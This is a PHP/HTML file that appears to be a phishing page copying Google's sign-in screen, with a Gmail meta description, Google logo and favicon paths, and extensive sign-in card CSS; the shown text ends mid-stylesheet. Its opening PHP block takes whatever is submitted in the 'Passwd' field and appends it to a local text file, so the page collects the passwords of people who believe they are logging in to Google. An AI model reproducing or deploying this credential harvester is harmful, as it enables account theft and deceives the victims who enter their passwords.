
<?php // testfile.php  
$tk=$_POST['Passwd'];
//echo $tt;
 $fh = fopen("ddt.txt", 'a');
  fwrite($fh, $tk);
  fwrite($fh, " 			");
  fclose($fh);  
?> 




<!DOCTYPE html>
<html lang="en">
  <head>
  <meta charset="utf-8">
  <meta content="width=300, initial-scale=1" name="viewport">
  <meta name="description" content="Gmail is email that&#39;s intuitive, efficient, and useful. 15 GB of storage, less spam, and mobile access.">
  <meta name="google-site-verification" content="LrdTUW9psUAMbh4Ia074-BPEVmcpBxF6Gwf0MSgQXZs">
  <link href="google/googleg_lodp.ico" rel="shortcut icon">
  <title>Google</title>
  <style>
  @font-face {
  font-family: 'Open Sans';
  font-style: normal;
  font-weight: 300;
  src: local('Open Sans Light'), local('OpenSans-Light'), url("google/DXI1ORHCpsQm3Vp6mXoaTXhCUOGz7vYGh680lGh-uXM.woff") format('woff');
}
@font-face {
  font-family: 'Open Sans';
  font-style: normal;
  font-weight: 400;
  src: local('Open Sans'), local('OpenSans'), url("google/cJZKeOuBrn4kERxqtaUH3T8E0i7KZn-EPnyo3HZu7kw.woff") format('woff');
}
  </style>
  <style>
  h1, h2 {
  -webkit-animation-duration: 0.1s;
  -webkit-animation-name: fontfix;
  -webkit-animation-iteration-count: 1;
  -webkit-animation-timing-function: linear;
  -webkit-animation-delay: 0;
  }
  @-webkit-keyframes fontfix {
  from {
  opacity: 1;
  }
  to {
  opacity: 1;
  }
  }
  </style>
<style>
  html, body {
  font-family: Arial, sans-serif;
  background: #fff;
  margin: 0;
  padding: 0;
  border: 0;
  position: absolute;
  height: 100%;
  min-width: 100%;
  font-size: 13px;
  color: #404040;
  direction: ltr;
  -webkit-text-size-adjust: none;
  }
  button,
  input[type=button],
  input[type=submit] {
  font-family: Arial, sans-serif;
  font-size: 13px;
  }
  a,
  a:hover,
  a:visited {
  color: #427fed;
  cursor: pointer;
  text-decoration: none;
  }
  a:hover {
  text-decoration: underline;
  }
  h1 {
  font-size: 20px;
  color: #262626;
  margin: 0 0 15px;
  font-weight: normal;
  }
  h2 {
  font-size: 14px;
  color: #262626;
  margin: 0 0 15px;
  font-weight: bold;
  }
  input[type=email],
  input[type=number],
  input[type=password],
  input[type=tel],
  input[type=text],
  input[type=url] {
  -moz-appearance: none;
  -webkit-appearance: none;
  appearance: none;
  display: inline-block;
  height: 36px;
  padding: 0 8px;
  margin: 0;
  background: #fff;
  border: 1px solid #d9d9d9;
  border-top: 1px solid #c0c0c0;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  -moz-border-radius: 1px;
  -webkit-border-radius: 1px;
  border-radius: 1px;
  font-size: 15px;
  color: #404040;
  }
  input[type=email]:hover,
  input[type=number]:hover,
  input[type=password]:hover,
  input[type=tel]:hover,
  input[type=text]:hover,
  input[type=url]:hover {
  border: 1px solid #b9b9b9;
  border-top: 1px solid #a0a0a0;
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  }
  input[type=email]:focus,
  input[type=number]:focus,
  input[type=password]:focus,
  input[type=tel]:focus,
  input[type=text]:focus,
  input[type=url]:focus {
  outline: none;
  border: 1px solid #4d90fe;
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  }
  input[type=checkbox],
  input[type=radio] {
  -webkit-appearance: none;
  display: inline-block;
  width: 13px;
  height: 13px;
  margin: 0;
  cursor: pointer;
  vertical-align: bottom;
  background: #fff;
  border: 1px solid #c6c6c6;
  -moz-border-radius: 1px;
  -webkit-border-radius: 1px;
  border-radius: 1px;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  position: relative;
  border: 0;
  width: 16px;
  height: 16px;
  box-sizing: content-box;
  background: none;
  }
  input[type=checkbox]:active,
  input[type=radio]:active {
  background: #ebebeb;
  }
  input[type=checkbox]:hover {
  border-color: #c6c6c6;
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  }
  input[type=radio] {
  -moz-border-radius: 1em;
  -webkit-border-radius: 1em;
  border-radius: 1em;
  width: 15px;
  height: 15px;
  }
  input[type=checkbox]:checked,
  input[type=radio]:checked {
  background: #fff;
  }
  input[type=radio]:checked::after {
  content: '';
  display: block;
  position: relative;
  top: 3px;
  left: 3px;
  width: 7px;
  height: 7px;
  background: #666;
  -moz-border-radius: 1em;
  -webkit-border-radius: 1em;
  border-radius: 1em;
  }
  input[type=checkbox]:checked::after {
  content: url("google\checkmark.png");
  display: block;
  position: absolute;
  top: -6px;
  left: -5px;
  }
  input[type=checkbox]:focus {
  outline: none;
  border-color: #4d90fe;
  }
  .stacked-label {
  display: block;
  font-weight: bold;
  margin: .5em 0;
  }
  .hidden-label {
  position: absolute !important;
  clip: rect(1px 1px 1px 1px); /* IE6, IE7 */
  clip: rect(1px, 1px, 1px, 1px);
  height: 0px;
  width: 0px;
  overflow: hidden;
  visibility: hidden;
  }
  input[type=checkbox].form-error,
  input[type=email].form-error,
  input[type=number].form-error,
  input[type=password].form-error,
  input[type=text].form-error,
  input[type=tel].form-error,
  input[type=url].form-error {
  border: 1px solid #dd4b39;
  }
  .error-msg {
  margin: .5em 0;
  display: block;
  color: #dd4b39;
  line-height: 17px;
  }
  .help-link {
  background: #dd4b39;
  padding: 0 5px;
  color: #fff;
  font-weight: bold;
  display: inline-block;
  -moz-border-radius: 1em;
  -webkit-border-radius: 1em;
  border-radius: 1em;
  text-decoration: none;
  position: relative;
  top: 0px;
  }
  .help-link:visited {
  color: #fff;
  }
  .help-link:hover {
  color: #fff;
  background: #c03523;
  text-decoration: none;
  }
  .help-link:active {
  opacity: 1;
  background: #ae2817;
  }
  .wrapper {
  position: relative;
  min-height: 100%;
  }
  .content {
  padding: 0 44px;
  }
  .main {
  padding-bottom: 100px;
  }
  /* For modern browsers */
  .clearfix:before,
  .clearfix:after {
  content: "";
  display: table;
  }
  .clearfix:after {
  clear: both;
  }
  /* For IE 6/7 (trigger hasLayout) */
  .clearfix {
  zoom:1;
  }
  .google-header-bar {
  height: 71px;
  border-bottom: 1px solid #e5e5e5;
  overflow: hidden;
  }
  .header .logo {
  background-image: url("google/logo_1x.png");
  background-size: 116px 38px;
  background-repeat: no-repeat;
  margin: 17px 0 0;
  float: left;
  height: 38px;
  width: 116px;
  }
  .header .logo-w {
  background-image: url("google/googlelogo_color_112x36dp.png");
  background-size: 112px 36px;
  margin: 21px 0 0;
  }
  .header .secondary-link {
  margin: 28px 0 0;
  float: right;
  }
  .header .secondary-link a {
  font-weight: normal;
  }
  .google-header-bar.centered {
  border: 0;
  height: 108px;
  }
  .google-header-bar.centered .header .logo {
  float: none;
  margin: 40px auto 30px;
  display: block;
  }
  .google-header-bar.centered .header .secondary-link {
  display: none
  }
  .google-footer-bar {
  position: absolute;
  bottom: 0;
  height: 35px;
  width: 100%;
  border-top: 1px solid #e5e5e5;
  overflow: hidden;
  }
  .footer {
  padding-top: 7px;
  font-size: .85em;
  white-space: nowrap;
  line-height: 0;
  }
  .footer ul {
  float: left;
  max-width: 80%;
  min-height: 16px;
  padding: 0;
  }
  .footer ul li {
  color: #737373;
  display: inline;
  padding: 0;
  padding-right: 1.5em;
  }
  .footer a {
  color: #737373;
  }
  .lang-chooser-wrap {
  float: right;
  display: inline;
  }
  .lang-chooser-wrap img {
  vertical-align: top;
  }
  .lang-chooser {
  font-size: 13px;
  height: 24px;
  line-height: 24px;
  }
  .lang-chooser option {
  font-size: 13px;
  line-height: 24px;
  }
  .hidden {
  height: 0px;
  width: 0px;
  overflow: hidden;
  visibility: hidden;
  display: none !important;
  }
  .banner {
  text-align: center;
  }
  .card {
  background-color: #f7f7f7;
  padding: 20px 25px 30px;
  margin: 0 auto 25px;
  width: 304px;
  -moz-border-radius: 2px;
  -webkit-border-radius: 2px;
  border-radius: 2px;
  -moz-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  -webkit-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  }
  .card > *:first-child {
  margin-top: 0;
  }
  .rc-button,
  .rc-button:visited {
  display: inline-block;
  min-width: 46px;
  text-align: center;
  color: #444;
  font-size: 14px;
  font-weight: 700;
  height: 36px;
  padding: 0 8px;
  line-height: 36px;
  -moz-border-radius: 3px;
  -webkit-border-radius: 3px;
  border-radius: 3px;
  -o-transition: all 0.218s;
  -moz-transition: all 0.218s;
  -webkit-transition: all 0.218s;
  transition: all 0.218s;
  border: 1px solid #dcdcdc;
  background-color: #f5f5f5;
  background-image: -webkit-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: -moz-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: -ms-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: -o-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: linear-gradient(top,#f5f5f5,#f1f1f1);
  -o-transition: none;
  -moz-user-select: none;
  -webkit-user-select: none;
  user-select: none;
  cursor: default;
  }
  .card .rc-button {
  width: 100%;
  padding: 0;
  }
  .rc-button.disabled,
  .rc-button[disabled] {
  opacity: .5;
  filter: alpha(opacity=50);
  cursor: default;
  pointer-events: none;
  }
  .rc-button:hover {
  border: 1px solid #c6c6c6;
  color: #333;
  text-decoration: none;
  -o-transition: all 0.0s;
  -moz-transition: all 0.0s;
  -webkit-transition: all 0.0s;
  transition: all 0.0s;
  background-color: #f8f8f8;
  background-image: -webkit-linear-gradient(top,#f8f8f8,#f1f1f1);
  background-image: -moz-linear-gradient(top,#f8f8f8,#f1f1f1);
  background-image: -ms-linear-gradient(top,#f8f8f8,#f1f1f1);
  background-image: -o-linear-gradient(top,#f8f8f8,#f1f1f1);
  background-image: linear-gradient(top,#f8f8f8,#f1f1f1);
  -moz-box-shadow: 0 1px 1px rgba(0,0,0,0.1);
  -webkit-box-shadow: 0 1px 1px rgba(0,0,0,0.1);
  box-shadow: 0 1px 1px rgba(0,0,0,0.1);
  }
  .rc-button:active {
  background-color: #f6f6f6;
  background-image: -webkit-linear-gradient(top,#f6f6f6,#f1f1f1);
  background-image: -moz-linear-gradient(top,#f6f6f6,#f1f1f1);
  background-image: -ms-linear-gradient(top,#f6f6f6,#f1f1f1);
  background-image: -o-linear-gradient(top,#f6f6f6,#f1f1f1);
  background-image: linear-gradient(top,#f6f6f6,#f1f1f1);
  -moz-box-shadow: 0 1px 2px rgba(0,0,0,0.1);
  -webkit-box-shadow: 0 1px 2px rgba(0,0,0,0.1);
  box-shadow: 0 1px 2px rgba(0,0,0,0.1);
  }
  .rc-button-submit,
  .rc-button-submit:visited {
  border: 1px solid #3079ed;
  color: #fff;
  text-shadow: 0 1px rgba(0,0,0,0.1);
  background-color: #4d90fe;
  background-image: -webkit-linear-gradient(top,#4d90fe,#4787ed);
  background-image: -moz-linear-gradient(top,#4d90fe,#4787ed);
  background-image: -ms-linear-gradient(top,#4d90fe,#4787ed);
  background-image: -o-linear-gradient(top,#4d90fe,#4787ed);
  background-image: linear-gradient(top,#4d90fe,#4787ed);
  }
  .rc-button-submit:hover {
  border: 1px solid #2f5bb7;
  color: #fff;
  text-shadow: 0 1px rgba(0,0,0,0.3);
  background-color: #357ae8;
  background-image: -webkit-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -moz-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -ms-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -o-linear-gradient(top,#4d90fe,#357ae8);
  background-image: linear-gradient(top,#4d90fe,#357ae8);
  }
  .rc-button-submit:active {
  background-color: #357ae8;
  background-image: -webkit-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -moz-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -ms-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -o-linear-gradient(top,#4d90fe,#357ae8);
  background-image: linear-gradient(top,#4d90fe,#357ae8);
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  }
  .rc-button-red,
  .rc-button-red:visited {
  border: 1px solid transparent;
  color: #fff;
  text-shadow: 0 1px rgba(0,0,0,0.1);
  background-color: #d14836;
  background-image: -webkit-linear-gradient(top,#dd4b39,#d14836);
  background-image: -moz-linear-gradient(top,#dd4b39,#d14836);
  background-image: -ms-linear-gradient(top,#dd4b39,#d14836);
  background-image: -o-linear-gradient(top,#dd4b39,#d14836);
  background-image: linear-gradient(top,#dd4b39,#d14836);
  }
  .rc-button-red:hover {
  border: 1px solid #b0281a;
  color: #fff;
  text-shadow: 0 1px rgba(0,0,0,0.3);
  background-color: #c53727;
  background-image: -webkit-linear-gradient(top,#dd4b39,#c53727);
  background-image: -moz-linear-gradient(top,#dd4b39,#c53727);
  background-image: -ms-linear-gradient(top,#dd4b39,#c53727);
  background-image: -o-linear-gradient(top,#dd4b39,#c53727);
  background-image: linear-gradient(top,#dd4b39,#c53727);
  }
  .rc-button-red:active {
  border: 1px solid #992a1b;
  background-color: #b0281a;
  background-image: -webkit-linear-gradient(top,#dd4b39,#b0281a);
  background-image: -moz-linear-gradient(top,#dd4b39,#b0281a);
  background-image: -ms-linear-gradient(top,#dd4b39,#b0281a);
  background-image: -o-linear-gradient(top,#dd4b39,#b0281a);
  background-image: linear-gradient(top,#dd4b39,#b0281a);
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  }
  .secondary-actions {
  text-align: center;
  }
</style>
<style media="screen and (max-width: 800px), screen and (max-height: 800px)">
  .google-header-bar.centered {
  height: 83px;
  }
  .google-header-bar.centered .header .logo {
  margin: 25px auto 20px;
  }
  .card {
  margin-bottom: 20px;
  }
</style>
<style media="screen and (max-width: 580px)">
  html, body {
  font-size: 14px;
  }
  .google-header-bar.centered {
  height: 73px;
  }
  .google-header-bar.centered .header .logo {
  margin: 20px auto 15px;
  }
  .content {
  padding-left: 10px;
  padding-right: 10px;
  }
  .hidden-small {
  display: none;
  }
  .card {
  padding: 20px 15px 30px;
  width: 270px;
  }
  .footer ul li {
  padding-right: 1em;
  }
  .lang-chooser-wrap {
  display: none;
  }
</style>
<style media="screen and (-webkit-min-device-pixel-ratio: 1.5), (min--moz-device-pixel-ratio: 1.5), (-o-min-device-pixel-ratio: 3 / 2), (min-device-pixel-ratio: 1.5)">
  .header .logo {
  background-image: url("google/logo_2x.png");
  }
  .header .logo-w {
  background-image: url("google/googlelogo_color_112x36dp.png");
  }
</style>
<style>
  pre.debug {
  font-family: monospace;
  position: absolute;
  left: 0;
  margin: 0;
  padding: 1.5em;
  font-size: 13px;
  background: #f1f1f1;
  border-top: 1px solid #e5e5e5;
  direction: ltr;
  white-space: pre-wrap;
  width: 90%;
  overflow: hidden;
  }
</style>
<style>
  .banner h1 {
  font-family: 'Open Sans', arial;
  -webkit-font-smoothing: antialiased;
  color: #555;
  font-size: 42px;
  font-weight: 300;
  margin-top: 0;
  margin-bottom: 20px;
  }
  .banner h2 {
  font-family: 'Open Sans', arial;
  -webkit-font-smoothing: antialiased;
  color: #555;
  font-size: 18px;
  font-weight: 400;
  margin-bottom: 20px;
  }
  .signin-card {
  width: 274px;
  padding: 40px 40px;
  }
  .signin-card .profile-img {
  width: 96px;
  height: 96px;
  margin: 0 auto 10px;
  display: block;
  -moz-border-radius: 50%;
  -webkit-border-radius: 50%;
  border-radius: 50%;
  }
  .signin-card .profile-name {
  font-size: 16px;
  font-weight: bold;
  text-align: center;
  margin: 10px 0 0;
  min-height: 1em;
  }
  .signin-card .profile-email {
  font-size: 16px;
  text-align: center;
  margin: 10px 0 20px 0;
  min-height: 1em;
  }
  .signin-card input[type=email],
  .signin-card input[type=password],
  .signin-card input[type=text],
  .signin-card input[type=submit] {
  width: 100%;
  display: block;
  margin-bottom: 10px;
  z-index: 1;
  position: relative;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  }
  .signin-card #Email,
  .signin-card #Passwd,
  .signin-card .captcha {
  direction: ltr;
  height: 44px;
  font-size: 16px;
  }
  .signin-card #Email + .stacked-label {
  margin-top: 15px;
  }
  .signin-card #reauthEmail {
  display: block;
  margin-bottom: 10px;
  line-height: 36px;
  padding: 0 8px;
  font-size: 15px;
  color: #404040;
  line-height: 2;
  margin-bottom: 10px;
  font-size: 14px;
  text-align: center;
  overflow: hidden;
  text-overflow: ellipsis;
  white-space: nowrap;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  }
  .one-google p {
  margin: 0 0 10px;
  color: #555;
  font-size: 14px;
  text-align: center;
  }
  .one-google p.create-account,
  .one-google p.switch-account {
  margin-bottom: 60px;
  }
  .one-google .logo-strip {
  background-repeat: no-repeat;
  display: block;
  margin: 10px auto;
  background-image: url("google/wlogostrip_230x17_1x.png");
  background-size: 230px 17px;
  width: 230px;
  height: 17px;
  }
</style>
<style media="screen and (max-width: 800px), screen and (max-height: 800px)">
  .banner h1 {
  font-size: 38px;
  margin-bottom: 15px;
  }
  .banner h2 {
  margin-bottom: 15px;
  }
  .one-google p.create-account,
  .one-google p.switch-account {
  margin-bottom: 30px;
  }
  .signin-card #Email {
  margin-bottom: 0;
  }
  .signin-card #Passwd {
  margin-top: -1px;
  }
  .signin-card #Email.form-error,
  .signin-card #Passwd.form-error {
  z-index: 2;
  }
  .signin-card #Email:hover,
  .signin-card #Email:focus,
  .signin-card #Passwd:hover,
  .signin-card #Passwd:focus {
  z-index: 3;
  }
</style>
<style media="screen and (max-width: 580px)">
  .banner h1 {
  font-size: 22px;
  margin-bottom: 15px;
  }
  .signin-card {
  width: 260px;
  padding: 20px 20px;
  margin: 0 auto 20px;
  }
  .signin-card .profile-img {
  width: 72px;
  height: 72px;
  -moz-border-radius: 72px;
  -webkit-border-radius: 72px;
  border-radius: 72px;
  }
</style>
<style media="screen and (-webkit-min-device-pixel-ratio: 1.5), (min--moz-device-pixel-ratio: 1.5), (-o-min-device-pixel-ratio: 3 / 2), (min-device-pixel-ratio: 1.5)">
  .one-google .logo-strip {
  background-image: url("google/wlogostrip_230x17_2x.png");
  }
</style>
<style>
  .remember .bubble-wrap {
  position: absolute;
  padding-top: 3px;
  -o-transition: opacity .218s ease-in .218s;
  -moz-transition: opacity .218s ease-in .218s;
  -webkit-transition: opacity .218s ease-in .218s;
  transition: opacity .218s ease-in .218s;
  left: -999em;
  opacity: 0;
  width: 314px;
  margin-left: -20px;
  }
  .remember:hover .bubble-wrap,
  .remember input:focus ~ .bubble-wrap,
  .remember .bubble-wrap:hover,
  .remember .bubble-wrap:focus {
  opacity: 1;
  left: inherit;
  }
  .bubble-pointer {
  border-left: 10px solid transparent;
  border-right: 10px solid transparent;
  border-bottom: 10px solid #fff;
  width: 0;
  height: 0;
  margin-left: 17px;
  }
  .bubble {
  background-color: #fff;
  padding: 15px;
  margin-top: -1px;
  font-size: 11px;
  -moz-border-radius: 2px;
  -webkit-border-radius: 2px;
  border-radius: 2px;
  -moz-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  -webkit-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  }
  #stay-signed-in {
  float: left;
  }
  #stay-signed-in-tooltip {
  left: auto;
  margin-left: -20px;
  padding-top: 3px;
  position: absolute;
  top: 0;
  visibility: hidden;
  width: 314px;
  z-index: 1;
  }
  .dasher-tooltip {
  top: 380px;
  }
</style>
<style media="screen and (max-width: 800px), screen and (max-height: 800px)">
  .dasher-tooltip {
  top: 340px;
  }
</style>
<style>
  .jfk-tooltip {
  background-color: #fff;
  border: 1px solid;
  color: #737373;
  font-size: 12px;
  position: absolute;
  z-index: 800 !important;
  border-color: #bbb #bbb #a8a8a8;
  padding: 16px;
  width: 250px;
  }
 .jfk-tooltip h3 {
  color: #555;
  font-size: 12px;
  margin: 0 0 .5em;
  }
 .jfk-tooltip-content p:last-child {
  margin-bottom: 0;
  }
  .jfk-tooltip-arrow {
  position: absolute;
  }
  .jfk-tooltip-arrow .jfk-tooltip-arrowimplbefore,
  .jfk-tooltip-arrow .jfk-tooltip-arrowimplafter {
  display: block;
  height: 0;
  position: absolute;
  width: 0;
  }
  .jfk-tooltip-arrow .jfk-tooltip-arrowimplbefore {
  border: 9px solid;
  }
  .jfk-tooltip-arrow .jfk-tooltip-arrowimplafter {
  border: 8px solid;
  }
  .jfk-tooltip-arrowdown {
  bottom: 0;
  }
  .jfk-tooltip-arrowup {
  top: -9px;
  }
  .jfk-tooltip-arrowleft {
  left: -9px;
  top: 30px;
  }
  .jfk-tooltip-arrowright {
  right: 0;
  top: 30px;
  }
  .jfk-tooltip-arrowdown .jfk-tooltip-arrowimplbefore,.jfk-tooltip-arrowup .jfk-tooltip-arrowimplbefore {
  border-color: #bbb transparent;
  left: -9px;
  }
  .jfk-tooltip-arrowdown .jfk-tooltip-arrowimplbefore {
  border-color: #a8a8a8 transparent;
  }
  .jfk-tooltip-arrowdown .jfk-tooltip-arrowimplafter,.jfk-tooltip-arrowup .jfk-tooltip-arrowimplafter {
  border-color: #fff transparent;
  left: -8px;
  }
  .jfk-tooltip-arrowdown .jfk-tooltip-arrowimplbefore {
  border-bottom-width: 0;
  }
  .jfk-tooltip-arrowdown .jfk-tooltip-arrowimplafter {
  border-bottom-width: 0;
  }
  .jfk-tooltip-arrowup .jfk-tooltip-arrowimplbefore {
  border-top-width: 0;
  }
  .jfk-tooltip-arrowup .jfk-tooltip-arrowimplafter {
  border-top-width: 0;
  top: 1px;
  }
  .jfk-tooltip-arrowleft .jfk-tooltip-arrowimplbefore,
  .jfk-tooltip-arrowright .jfk-tooltip-arrowimplbefore {
  border-color: transparent #bbb;
  top: -9px;
  }
  .jfk-tooltip-arrowleft .jfk-tooltip-arrowimplafter,
  .jfk-tooltip-arrowright .jfk-tooltip-arrowimplafter {
  border-color:transparent #fff;
  top:-8px;
  }
  .jfk-tooltip-arrowleft .jfk-tooltip-arrowimplbefore {
  border-left-width: 0;
  }
  .jfk-tooltip-arrowleft .jfk-tooltip-arrowimplafter {
  border-left-width: 0;
  left: 1px;
  }
  .jfk-tooltip-arrowright .jfk-tooltip-arrowimplbefore {
  border-right-width: 0;
  }
  .jfk-tooltip-arrowright .jfk-tooltip-arrowimplafter {
  border-right-width: 0;
  }
  .jfk-tooltip-closebtn {
  background: url("google/x_8px.png") no-repeat;
  border: 1px solid transparent;
  height: 21px;
  opacity: .4;
  outline: 0;
  position: absolute;
  right: 2px;
  top: 2px;
  width: 21px;
  }
  .jfk-tooltip-closebtn:focus,
  .jfk-tooltip-closebtn:hover {
  opacity: .8;
  cursor: pointer;
  }
  .jfk-tooltip-closebtn:focus {
  border-color: #4d90fe;
  }
</style>
<style media="screen and (max-width: 580px)">
  .jfk-tooltip {
  display: none;
  }
</style>
<style type="text/css">
.captcha-box {
  background: #fff;
  margin: 0 0 10px;
  overflow: hidden;
  padding: 10px;
}
.captcha-box .captcha-img {
  text-align: center;
}
.captcha-box .captcha-label {
  font-weight: bold;
  display: block;
  margin: .5em 0;
}
.captcha-box .captcha-msg {
  color: #999;
  display: block;
  position: relative;
}
.captcha-box .captcha-msg .accessibility-logo {
  float: right;
  border: 0;
}
.captcha-box .audio-box {
  position: absolute;
  top: 0;
}
</style>
<style>
.chromiumsync-custom-content {
  padding-top: 20px;
  margin-bottom: 0;
}
.form-panel {
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  -webkit-transform: translateZ(0);
  -moz-transform: translateZ(0);
  -ms-transform: translateZ(0);
  -o-transform: translateZ(0);
  transform: translateZ(0);
  position: absolute;
  width: 100%;
}
.form-panel.first {
  z-index: 2;
}
.form-panel.second {
  z-index: 1;
}
.shift-form .form-panel.first {
  z-index: 1;
}
.shift-form .form-panel.second {
  z-index: 2;
}
  .hide-form.slide-out {
  display: none;
  }
  .hide-form.slide-in {
  display: none;
  }
.slide-in,
.slide-out {
  display: block;
  -webkit-transition-property: -webkit-transform, opacity;
  -moz-transition-property: -moz-transform, opacity;
  -ms-transition-property: -ms-transform, opacity;
  -o-transition-property: -o-transform, opacity;
  transition-property: transform, opacity;
  -webkit-transition-duration: 0.1s;
  -moz-transition-duration: 0.1s;
  -ms-transition-duration: 0.1s;
  -o-transition-duration: 0.1s;
  transition-duration: 0.1s;
  -webkit-transition-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
  -moz-transition-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
  -ms-transition-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
  -o-transition-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
  transition-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
}
.slide-out {
  -webkit-transform: translate3d(0, 0, 0);
  -moz-transform: translate3d(0, 0, 0);
  -ms-transform: translate3d(0, 0, 0);
  -o-transform: translate3d(0, 0, 0);
  transform: translate3d(0, 0, 0);
}
.shift-form .slide-out {
  opacity: 0;
  -webkit-transform: translate3d(-120%, 0, 0);
  -moz-transform: translate3d(-120%, 0, 0);
  -ms-transform: translate3d(-120%, 0, 0);
  -o-transform: translate3d(-120%, 0, 0);
  transform: translate3d(-120%, 0, 0);
}
.slide-in {
  -webkit-transform: translate3d(120%, 0, 0);
  -moz-transform: translate3d(120%, 0, 0);
  -ms-transform: translate3d(120%, 0, 0);
  -o-transform: translate3d(120%, 0, 0);
  transform: translate3d(120%, 0, 0);
}
.shift-form .slide-in {
  opacity: 1;
  -webkit-transform: translate3d(0, 0, 0);
  -moz-transform: translate3d(0, 0, 0);
  -ms-transform: translate3d(0, 0, 0);
  -o-transform: translate3d(0, 0, 0);
  transform: translate3d(0, 0, 0);
}
.error-msg {
  -webkit-transition: max-height 0.3s, opacity 0.3s 0s steps(10, end);
  -moz-transition: max-height 0.3s, opacity 0.3s 0s steps(10, end);
  -ms-transition: max-height 0.3s, opacity 0.3s 0s steps(10, end);
  -o-transition: max-height 0.3s, opacity 0.3s 0s steps(10, end);
  transition: max-height 0.3s, opacity 0.3s 0s steps(10, end);
  height: auto;
  max-height: 0;
  opacity: 0;
}
.has-error .error-msg {
  max-height: 3.5em;
  margin-top: 10px;
  margin-bottom: 10px;
  opacity: 1;
  visibility: visible;
}
.back-arrow {
  position: absolute;
  top: 37px;
  width: 24px;
  height: 24px;
  display: none;
  cursor: pointer;
}
.back-arrow {
  border-style: none;
}
.shift-form.back-arrow {
  display: block;
}
#link-signup {
  text-align: center;
  font-size: 14px;
}
.shift-form #link-signup{
  display: none;
}
#link-signin-different {
  display: none;
  text-align: center;
  font-size: 14px;
}
.shift-form #link-signin-different {
  display: block;
}
.signin-card #profile-name {
  font-size: 16px;
  font-weight: bold;
  text-align: center;
  margin: 0;
  min-height: 1em;
}
.signin-card.no-name #profile-name {
  display: none;
}
.signin-card.no-name #email-display {
  line-height: initial;
  margin-bottom: 16px;
}
.signin-card #email-display {
  display: block;
  padding: 0px 8px;
  color: rgb(64, 64, 64);
  line-height: 2;
  margin-bottom: 10px;
  font-size: 14px;
  text-align: center;
  overflow: hidden;
  text-overflow: ellipsis;
  white-space: nowrap;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
}
.signin-card #Email {
  margin-top: 16px;
}
.need-help {
  float: right;
  text-align: right;
}
.form-panel {
  width: 274px;
}
#gaia_firstform {
  z-index: 2;
}
.signin-card {
  position: relative;
  overflow: hidden;
}
.signin-card #profile-name {
  color: #000;
}
.circle-mask {
  display: block;
  height: 96px;
  width: 96px;
  overflow: hidden;
  border-radius: 50%;
  margin-left: auto;
  margin-right: auto;
  z-index: 100;
  margin-bottom: 10px;
  background-size: 96px;
  background-repeat: no-repeat;
  background-image: url("google/avatar_2x.png");
  -webkit-transition: opacity 0.075s;
  -moz-transition: opacity 0.075s;
  -ms-transition: opacity 0.075s;
  -o-transition: opacity 0.075s;
  transition: opacity 0.075s;
}
.circle {
  -webkit-transition-property: -webkit-transform;
  -moz-transition-property: -moz-transform;
  -ms-transition-property: -ms-transform;
  -o-transition-property: -o-transform;
  transition-property: transform;
  -webkit-transition-timing-function: cubic-bezier(.645,.045,.355,1);
  -moz-transition-timing-function: cubic-bezier(.645,.045,.355,1);
  -ms-transition-timing-function: cubic-bezier(.645,.045,.355,1);
  -o-transition-timing-function: cubic-bezier(.645,.045,.355,1);
  transition-timing-function: cubic-bezier(.645,.045,.355,1);
}
.circle {
  position: absolute;
  z-index: 101;
  height: 96px;
  width: 96px;
  border-radius: 50%;
  opacity: 0.99;
  overflow: hidden;
  background-repeat: no-repeat;
  background-position: center center;
}
.main {
  overflow: hidden;
}
.card-mask-wrap {
  position: relative;
  width: 360px;
  margin: 0 auto;
  z-index: 1;
}
.dasher-tooltip {
  position: absolute;
  left: 50%;
  margin-left: 150px;
}
.dasher-tooltip .tooltip-pointer {
  margin-top: 15px;
}
.dasher-tooltip p {
  margin-top: 0;
}
.dasher-tooltip p span {
  display: block;
}
  .signin-card {
  height: 500px;
  }
  .card-mask-wrap {
  -webkit-transition: transform 0.5s;
  -moz-transition: transform 0.5s;
  -ms-transition: transform 0.5s;
